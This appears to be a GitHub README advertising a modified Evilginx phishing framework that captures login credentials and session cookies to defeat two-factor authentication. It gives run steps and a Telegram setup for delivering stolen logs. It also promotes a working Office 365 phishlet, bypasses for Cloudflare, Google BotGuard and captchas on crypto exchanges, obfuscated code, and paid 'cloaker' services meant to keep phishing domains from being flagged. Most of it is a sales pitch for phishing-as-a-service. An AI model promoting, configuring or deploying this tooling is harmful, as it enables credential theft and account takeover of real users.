
<p align="center">

  <img alt="Evilginx2 Logo" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-logo-512.png" height="160" />
    <img alt="Evilginx2 Title" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-title-black-512.png" height="60" />

**Evilginx** is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.


<p align="center">
    <img alt="Evilginx2 Title" src="https://github.com/belph3gorgit/EvilGinx-3.5-bypass/blob/main/screen1.png?raw=true"/>
    <img alt="Evilginx2 Title" src="https://github.com/belph3gorgit/EvilGinx-3.5-bypass/blob/main/screen2.png?raw=true"/>
    <img alt="Evilginx2 Title" src="https://github.com/belph3gorgit/EvilGinx-3.5-bypass/blob/main/screen3.png?raw=true"/>

# How to run it ?

1. sudo apt install git<br/>
2. git clone https://github.com/belph3gorgit/EvilGinx-3.5-bypass<br/>
3. cd EvilGinx-3.5-bypass<br/>
4. ./build/evilginx -p phishlets<br/>
5. Done !! <br/>

# How to configurate it ?
Please read official evilginx 2 tutorials.

# How to setup Telegram ?
Just create bot, create group, add bot to group, get group chat id, get bot token.<br/>
execute command: config webhook_telegram bot-token/-chatid<br/>

# Evilginx 3.5 + bypass
- Free o365.yaml (Outlook, Live, Microsoft etc) phishlet working. Last test: 2024/11/4<br/>
(Read bypass methods, if u don't have specified bypass activated some of the 3rd party will not work)<br/>
<br/>
- Telegram webhook.<br/>
- Identifier obfuscation to prevent websites from detecting evilginx.<br/>
- Fixed: Cookie grab failure when cookies have protection symbols.<br/>
(Problem was that some of the symbols used in cookies are not supported by the original evilginx and it can't detect the set-cookie event. )<br/>
- Fixed: Stability issues with original evilginx. Open doors to handle unlimited number of users at the same time.<br/>
- Fully obfuscated hardcoded http_proxy.go file that is not readable to prevent fast red-flag on domains.<br/>
<br/>

# -- Bypass methods --
Cloudflare - Required if site has Cloudflare Anti-DDoS page enabled.<br/>
BotGuard - Required for sites like Google (verified, trusted accounts), Microsoft o365 (some of) 3rd parties login pages usually big companies or extra protection without it lets say only 70% accounts would work etc etc.<br/>
hCaptcha, recaptcha - Required for sites that have hCaptcha, recaptcha on forms or as Anti-Ddos.<br/>
GeeTest - Needed for crypto websites like Binance, Coinbase, Blockchain etc etc<br/>
Customjs - Required for sites that have their own protection for certain actions.<br/>
<br/>

# -- Cloaker Methods --
Blacktds - One of the most popular and easiest option to keep your website never red. [CONS: REQUIRES MONTHLY PAYMENTS]<br/>
Cloudflare - One of the popular and cheapest options to keep your website red for longer.<br/>
Custom Js - Number one expensive protection against red, one pay for lifetime.<br/>
Custom php - Number two expensive protection against reds, one pay for lifetime<br/>
Custom Firewall - Cheap settings to avoid large amount of bots. [Doesn't fully protect against red, depends on usage.]<br/>
<br/>

# All methods are activated manually after payment.
Usually people request website lets say aol.com it require recaptcha bypass so we configure it properly and enable required bypass method.<br/>
Then we setup it on our site, add u to telegram group where logs delivered and provide link so u can test.<br/>
When u done testing, u pay for site and we send files with required methods enabled.<br/>

# We support developers as well.
So in addition if u want to enable any bypass method without ordering website it will cost more.<br/>
Since its hard to explain how to do it without doing it on website as example so u can learn.<br/>

# NO UPFRONT PAYMENTS REQUIRED IN ANY CASE !
# Telegram @Belphs

## License
<br/>
**evilginx2** is made by Kuba Gretzky ([@mrgretzky](https://twitter.com/mrgretzky)) and it's released under BSD-3 license.<br/>
**evilginx 3.5 +bypass** is made by @Belphs and it's released under BSD-3 license.
